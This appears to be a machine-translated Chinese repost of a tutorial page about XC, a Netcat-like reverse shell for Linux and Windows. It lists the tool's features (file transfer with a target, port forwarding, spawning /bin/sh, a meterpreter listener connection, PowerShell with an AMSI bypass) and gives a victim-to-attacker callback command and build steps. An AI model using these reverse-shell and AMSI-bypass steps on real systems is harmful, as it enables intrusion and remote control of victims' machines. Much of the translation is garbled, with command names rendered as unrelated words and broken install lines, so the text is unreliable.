# Linux 和 Windows 的反向小外壳

> 原文：<https://kalilinuxtutorials.com/xc/>

[![](img/a7a81e064e0d55c03ba821d20545a7da.png)](https://blogger.googleusercontent.com/img/a/AVvXsEgQBVN90VsAw7erLA4up8S4UpxQE9Dt8dad5iNRqBAwDSfR0fsXJKIzNmbpRASkmoIpAKI7Tw4wcP0_j_3m-9YesEfyUiqpivfmkiqCkM5o0y7qLzlTvQTyqIi8pMIYuNax6qTbIyIcduEAJePtHA8XpVom4RXy2uxSvXQNkvELE7tngS9SSXDAcILK=s728)

**XC** 是一个类似 Netcat 的用于 Linux & Windows 的反向 shell。

**特性**

**窗户**

**用法:
└共享命令:！退出
！上传**

*   **上传文件到目标
    ！下载**
*   **从目标
    下载文件！lfwd**
*   **本地端口转发(如 ssh -L)
    ！rfwd**
*   **远程端口转发(如 ssh -R)
    ！lsfwd**
*   **列出主动转发
    ！rmfwd**
*   **按索引向前删除
    ！插件**
*   **列出可用插件
    ！插件**
*   **执行一个插件
    ！产卵**
*   **在指定端口
    产生另一个客户端！壳牌**
*   运行/bin/sh
    ！鲁纳斯
*   **用指定用户
    重启 xc！遇到了**
*   **连接到 x64/meterpreter/reverse_tcp 监听器└操作系统特定命令:！powershell**
    *   **通过 AMSI 旁路
        启动 powershell！rc**
    *   **连接到本地 bind shell 并通过它重新启动该客户端
        ！鲁纳普斯**
    *   **使用 powershell
        以指定用户重启 xc！vulns**
    *   **检查常见漏洞**

**Linux**

**用法:
└共享命令:！退出
！上传**

*   **上传文件到目标
    ！下载**
*   **从目标
    下载文件！lfwd**
*   **本地端口转发(如 ssh -L)
    ！rfwd**
*   **远程端口转发(如 ssh -R)
    ！lsfwd**
*   **列出主动转发
    ！rmfwd**
*   **按索引向前删除
    ！插件**
*   **列出可用插件
    ！插件**
*   **执行一个插件
    ！产卵**
*   **在指定端口
    产生另一个客户端！壳牌**
*   运行/bin/sh
    ！鲁纳斯
*   **用指定用户
    重启 xc！遇到了**
*   **连接到 x64/meterpreter/reverse_tcp 监听器
    └操作系统特定命令:
    ！宋承宪**
*   **使用指定端口**上配置的密钥启动 sshd

**例题**

*   Linux 攻击者:`**rlwrap xc -l -p 1337**`(服务器)
*   WindowsVictim : `**xc.exe 10.10.14.4 1337**`(客户端)
*   参数 ss:

**设置**

请确保您运行的是 golang 版本，旧版本将无法编译。我在 ubuntu: `**go version go1.16.2 linux/amd64**`和 kali `**go version go1.15.9 linux/amd64**`上测试过

**git clone–recurse-submodules https://github.com/xct/xc.git
go 111 module = off go getgolang.org/x/sys/…
go 111 module = off go get golang.org/x/text/encoding/unicode
go 111 module = off go get github.com/hashicorp/yamux
sudo apt-get install rlwrap upx**

**Linux**

**python3 build.py**

[**Download**](https://github.com/xct/xc)